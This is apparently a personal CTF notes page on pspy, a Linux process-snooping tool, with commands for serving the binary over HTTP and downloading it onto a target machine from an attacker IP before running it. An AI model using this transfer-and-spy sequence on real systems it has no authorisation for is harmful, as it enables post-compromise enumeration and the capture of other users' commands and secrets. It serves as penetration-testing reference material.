# 💢 pspy
Tags: #💢
Related to: [[Vulnerability Analysis]]
See also: 
Previous: [[ ]]

---
## Description
pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.

The tool gathers the info from procfs scans. Inotify watchers placed on selected parts of the file system trigger these scans to catch short-lived processes.

## Usage Examples

Download statically compiled binary locally:

	wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s

Check that the file is an executable:

	file pspy64s

Start Simple HTTP Server:

	python -m SimpleHTTPServer 80		// Python
	python3	-m http.server 80			// Python 3

Download to target system:

	curl 10.10.17.201/pspy64s -o pspy64s
	wget 10.10.17.201/pspy64s -o pspy64s

Spy on processes:

```
./pspy64s -fc	// -f 	print file system events
				// -c	color
```

---
## References
- https://github.com/DominicBreuker/pspy/releases